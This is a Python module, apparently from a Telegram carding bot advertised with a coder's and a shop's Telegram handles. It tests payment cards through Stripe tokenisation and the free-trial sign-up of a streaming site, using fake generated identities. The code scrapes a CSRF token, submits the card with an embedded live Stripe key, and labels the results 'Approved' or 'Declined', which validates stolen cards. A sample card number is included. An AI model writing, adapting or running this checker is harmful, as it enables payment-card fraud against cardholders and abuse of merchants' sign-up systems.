# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
import random, requests as req
from faker import Faker
from Commands.Gates._template import run_gate

_GATEWAY = 'Stripe Auth'
_f = Faker('en_US')

_email    = lambda: f"{_f.user_name()}@{random.choice(['hotmail.com','gmail.com','yahoo.com','outlook.com'])}"
_password = lambda: _f.password(length=6)
_name     = lambda: (_f.first_name().replace(' ','').replace('.',''), _f.last_name())

def _found(html, start, end):
    try:
        s = html.index(start) + len(start)
        return html[s:html.index(end, s)]
    except ValueError:
        return ''


def _flow(num, mes, ano, cvv):
    mes = mes.zfill(2)
    ano = ano[-2:] if len(ano) == 4 else ano
    sess = req.Session()
    hdrs = {
        'sec-ch-ua-platform': 'Windows',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'sec-gpc': '1',
        'accept-language': 'es-MX,es;q=0.8',
    }
    r1 = sess.get('https://register.ohjazz.tv/free-trial', headers=hdrs, timeout=20)
    csrf = _found(r1.text, 'name="csrf-token" content="', '"')

    hdrs['content-type'] = 'application/x-www-form-urlencoded'
    data = (
        f"guid=NA&muid=NA&sid=NA&referrer=https%3A%2F%2Fregister.ohjazz.tv&time_on_page=53403"
        f"&card[number]={num}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}"
        f"&payment_user_agent=stripe.js%2F668d00c08a%3B+stripe-js-v3%2F668d00c08a%3B+split-card-element"
        f"&client_attribution_metadata[client_session_id]=f3aa7db3-8407-41d1-bf9e-9bfd8de417ec"
        f"&client_attribution_metadata[merchant_integration_source]=elements"
        f"&client_attribution_metadata[merchant_integration_subtype]=split-card-element"
        f"&client_attribution_metadata[merchant_integration_version]=2017"
        f"&client_attribution_metadata[wallet_config_id]=6ee68c90-7822-4d7f-ac02-a3716acfb2bd"
        f"&key=pk_live_51K9o9cCdiyMESuFXV3d7e04uyUPCMA5vPZ2oY0NmsRWDonK6l3raWJ8lGwM8UP7852BcLcDwGSnNC7LVeg5ZpWR400nmh8o3Mv"
    )
    r2j = sess.post('https://api.stripe.com/v1/tokens', headers=hdrs, data=data, timeout=20).json()
    tk_id = r2j.get('id')
    if not tk_id:
        return {'status': False, 'raise': r2j.get('error', {}).get('message', 'No Stripe token')[:200]}

    hdrs['content-type'] = 'application/json'
    hdrs['x-csrf-token'] = csrf
    fn, ln = _name()
    payload = {
        'token': tk_id, 'email': _email(), 'first_name': fn, 'last_name': ln,
        'password': _password(), 'package_name': 'Mensual', 'plan_id': '1', 'coupon_code': '',
    }
    r3 = sess.post('https://register.ohjazz.tv/subscription_trial',
                   headers=hdrs, json=payload, allow_redirects=False, timeout=20)
    r3t = r3.text
    try:
        r3j = r3.json() if 'error' in r3t else {}
    except Exception:
        r3j = {}

    if 'Your card was declined.' in r3t:
        return {'status': True, 'success': False, 'response': 'Declined ❌ | Your card was declined.'}
    elif '<title>Redirecting to https://register.ohjazz.tv</title>' in r3t:
        return {'status': True, 'success': True, 'response': 'Approved ✅ | Free trial created'}
    elif "security code is incorrect" in r3t:
        return {'status': True, 'success': True, 'response': "Approved ✅ | CVV incorrect"}
    elif 'error' in r3t:
        return {'status': True, 'success': False, 'response': f"Declined ❌ | {r3j.get('error', 'declined')[:120]}"}
    else:
        return {'status': True, 'success': False, 'response': f"Declined ❌ | {r3t[:80]}"}


def _checker(cc, binData):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3])
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def gateCmd(bot, update, gestion):
    run_gate(bot, update, gestion, gateway=_GATEWAY, checker=_checker)


def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}


if __name__ == "__main__":
    cards = "4599858290851419|12|2026|985"
    print(_checker(cards, ""))



# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
